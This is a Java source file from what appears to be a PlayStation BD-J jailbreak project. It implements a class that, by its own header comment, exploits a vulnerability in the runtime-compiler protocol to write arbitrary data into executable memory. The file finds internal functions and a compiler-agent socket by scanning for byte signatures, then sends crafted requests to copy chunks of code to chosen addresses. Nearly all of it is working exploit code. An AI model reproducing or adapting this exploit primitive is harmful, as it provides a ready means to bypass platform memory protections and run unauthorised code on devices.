/*
 * Copyright (C) 2021 Andy Nguyen
 *
 * This software may be modified and distributed under the terms
 * of the MIT license.  See the LICENSE file for details.
 */

package com.bdjb.jit;

import com.bdjb.api.API;
import com.bdjb.api.Buffer;
import com.bdjb.api.Int8;
import com.bdjb.api.Text;

/**
 * JIT implementation that exploits a vulnerability in the runtime-compiler protocol to copy data to
 * executable memory.
 */
public final class JitCompilerReceiverImpl extends AbstractJit {
  // We actually have 32MB of code memory, but reserve 8MB for Java JIT.
  public static final int MAX_CODE_SIZE = 24 * 1024 * 1024;

  private static final int SCE_KERNEL_MODULE_INFO_SIZE = 0x160;

  private static final int COMPILER_AGENT_REQUEST_SIZE = 0x58;

  private static final byte ACK_MAGIC_NUMBER = (byte) 0xAA;

  private static final byte[] BUFFER_BLOB_CREATE_SEQ = {
    (byte) 0x89, (byte) 0xF8, (byte) 0x49, (byte) 0x8B, (byte) 0x0F
  };

  private static final byte[] COMPILER_AGENT_SENDER_THREAD_SEQ = {
    (byte) 0x4C, (byte) 0x8B, (byte) 0x70, (byte) 0x08, (byte) 0x41
  };

  private static final int BDJ_MODULE_HANDLE = 0;

  private static final String SCE_KERNEL_GET_MODULE_INFO_SYMBOL = "sceKernelGetModuleInfo";
  private static final String WRITE_SYMBOL = "write";
  private static final String READ_SYMBOL = "read";

  private static JitCompilerReceiverImpl instance;

  private long sceKernelGetModuleInfo;
  private long read;
  private long write;
  private long BufferBlob__create;

  private int compilerAgentSocket;

  private JitCompilerReceiverImpl() {
    this.init();
  }

  public static synchronized JitCompilerReceiverImpl getInstance() {
    if (instance == null) {
      instance = new JitCompilerReceiverImpl();
    }
    return instance;
  }

  private void init() {
    initSymbols();
    initJitHelpers();
  }

  private void initSymbols() {
    sceKernelGetModuleInfo =
        api.dlsym(API.LIBKERNEL_MODULE_HANDLE, SCE_KERNEL_GET_MODULE_INFO_SYMBOL);
    read = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, READ_SYMBOL);
    write = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, WRITE_SYMBOL);

    if (sceKernelGetModuleInfo == 0 || read == 0 || write == 0) {
      throw new InternalError("symbols not found");
    }
  }

  private void initJitHelpers() {
    Buffer modinfo = new Buffer(SCE_KERNEL_MODULE_INFO_SIZE);
    modinfo.fill((byte) 0);
    modinfo.putLong(0x00, SCE_KERNEL_MODULE_INFO_SIZE);
    if (sceKernelGetModuleInfo(BDJ_MODULE_HANDLE, modinfo) != 0) {
      throw new InternalError("sceKernelGetModuleInfo failed");
    }

    long bdjBase = modinfo.getLong(0x108);
    int bdjSize = modinfo.getInt(0x110);

    int i = 0;
    while (i < bdjSize
        && api.memcmp(bdjBase + i, BUFFER_BLOB_CREATE_SEQ, BUFFER_BLOB_CREATE_SEQ.length) != 0) {
      i++;
    }
    if (i == bdjSize) {
      throw new InternalError("BufferBlob::create not found");
    }
    BufferBlob__create = bdjBase + i - 0x21;

    i = 0;
    while (i < bdjSize
        && api.memcmp(
                bdjBase + i,
                COMPILER_AGENT_SENDER_THREAD_SEQ,
                COMPILER_AGENT_SENDER_THREAD_SEQ.length)
            != 0) {
      i++;
    }
    if (i == bdjSize) {
      throw new InternalError("compiler agent socket not found");
    }
    long compilerAgentSocketOpcode = bdjBase + i - 0x10;
    compilerAgentSocket =
        api.read32(compilerAgentSocketOpcode + api.read32(compilerAgentSocketOpcode + 0x3) + 0x7);
  }

  int sceKernelGetModuleInfo(int modid, Buffer info) {
    return (int) api.call(sceKernelGetModuleInfo, modid, info != null ? info.address() : 0);
  }

  long write(int fd, Buffer buf, long nbytes) {
    return api.call(write, fd, buf != null ? buf.address() : 0, nbytes);
  }

  long read(int fd, Buffer buf, long nbytes) {
    return api.call(read, fd, buf != null ? buf.address() : 0, nbytes);
  }

  long BufferBlob__create(Text name, int buffer_size) {
    return api.call(BufferBlob__create, name != null ? name.address() : 0, buffer_size);
  }

  protected long jitMap(long size, long alignment) {
    if (size >= MAX_CODE_SIZE) {
      throw new IllegalArgumentException("size too big");
    }
    long blob =
        BufferBlob__create(new Text("jit"), (int) (align(size + 0x88 + alignment - 1, PAGE_SIZE)));
    if (blob == 0) {
      throw new OutOfMemoryError("BufferBlob__create failed");
    }
    long code = blob + api.read32(blob + 0x20);
    return align(code, alignment);
  }

  protected void jitCopy(long dest, byte[] src, long n) {
    Buffer req = new Buffer(COMPILER_AGENT_REQUEST_SIZE);
    Int8 resp = new Int8();

    byte[] chunk = new byte[CHUNK_SIZE];

    for (long i = 0; i < n; i += chunk.length) {
      api.memset(chunk, 0, chunk.length);

      System.arraycopy(src, (int) i, chunk, 0, (int) Math.min(n - i, chunk.length));

      req.fill((byte) 0);
      req.put(0x00, chunk);
      req.putLong(0x38, dest + i - 0x28);
      if (write(compilerAgentSocket, req, req.size()) != req.size()) {
        throw new InternalError("write failed");
      }

      resp.set((byte) 0);
      if (read(compilerAgentSocket, resp, resp.size()) != resp.size()) {
        throw new InternalError("read failed");
      }

      if (resp.get() != ACK_MAGIC_NUMBER) {
        throw new AssertionError("wrong compiler response");
      }
    }
  }
}
